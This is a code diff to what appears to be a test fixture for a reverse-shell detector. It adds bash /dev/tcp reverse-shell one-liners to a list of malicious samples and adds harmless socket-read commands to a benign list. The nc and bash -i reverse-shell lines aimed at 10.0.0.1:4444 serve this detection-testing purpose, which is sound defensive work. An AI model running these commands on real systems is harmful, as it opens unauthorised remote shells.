@@ -11,6 +11,9 @@ const REVERSE_SHELLS = [
   "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
   "sh -i >& /dev/udp/10.0.0.1/4444 0>&1",
   "0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196",
+  "exec 3<>/dev/tcp/10.0.0.1/4444",
+  "bash < /dev/tcp/10.0.0.1/4444",
+  "bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'",
   "h=10.0.0.1;p=4444;bash -i >& /dev/tcp/$h/$p 0>&1",
   "nc -e /bin/sh 10.0.0.1 4444",
   "nc 10.0.0.1 4444 -e /bin/bash",
@@ -56,6 +59,9 @@ const BENIGN = [
   "strace -f -e trace=socket,connect /bin/sh ./script.sh",
   "systemctl restart docker.socket",
   "ls config/dev/tcp/",
+  // read-only /dev/tcp: the wait-for-port idiom and a plain socket read.
+  "timeout 1 bash -c '</dev/tcp/localhost/5432'",
+  "cat < /dev/tcp/example.com/80",
   "echo use /dev/tcp for bash net",
   "ssh user@host",
   // opens a socket AND shells out, but with no socket-fd wiring — a benign
